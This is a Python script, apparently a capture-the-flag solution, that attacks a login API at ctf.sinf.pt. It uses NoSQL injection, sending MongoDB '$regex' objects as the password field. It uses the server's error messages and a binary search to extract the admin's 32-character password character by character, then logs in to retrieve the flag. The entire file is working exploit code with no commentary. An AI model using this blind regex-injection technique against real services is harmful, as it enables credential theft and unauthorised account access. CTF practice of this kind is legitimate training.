from typing import Tuple, List
import requests

url = "http://ctf.sinf.pt:44977/api/login"
username = "admin"
length = 32

characters: List[Tuple[str, str]] = [ # divide the characters in groups of contiguous ASCII characters
    ('0', '9'),
    ('a', 'z'),
    ('A', 'Z'),
    ('!', '!'),
    ('#', '&'),
    ('(', '*'),
    ('@', '@'),
    ('[', '['),
    (']', '^'),
    ('{', '{'),
    ('}', '}'),
]

def escape_char(char: str) -> str:
    """Escapes a character for use in a regex"""

    if char in ['.', '^', '$', '*', '+', '?', '(', ')', '[', ']', '{', '}', '\\']:
        return f"\\{char}"
    return char

def get_char_range_at(index: int) -> Tuple[str, str]:
    """Returns the range of characters that can be at the given index"""

    for char_range in characters:
        escaped_range = f"[{escape_char(char_range[0])}-{escape_char(char_range[1])}]"
        payload = f"^.{{{index}}}{escaped_range}.{{{length - index - 1}}}$"

        res = requests.post(url, json={
            "username": username,
            "password": {
                "$regex": payload
            }
        })

        if res.json()["error"] == "Invalid password!":
            return char_range

    raise Exception("Cannot derive char range")

def get_char_at(index: int) -> str:
    """Returns the character that can be at the given index"""

    char_range = get_char_range_at(index)

    left = ord(char_range[0])
    right = ord(char_range[1])

    while left < right:
        middle = (left + right + 1) // 2
        curr_range = f"[{escape_char(chr(middle))}-{escape_char(chr(right))}]"
        payload = f"^.{{{index}}}{curr_range}.{{{length - index - 1}}}$"

        res = requests.post(url, json={
            "username": username,
            "password": {
                "$regex": payload
            }
        })

        if res.json()["error"] == "Invalid password!":
            left = middle
        else:
            right = middle - 1
            
    return chr(left)

print("Username:", username)

print("Password: ", end='', flush=True)

password = ""
for c in (get_char_at(i) for i in range(32)):
    password += c
    print(c, end='', flush=True)
print()

flag = requests.post(url, json={
    "username": username,
    "password": password
}).json()["flag"]

print(f"Flag: {flag}")
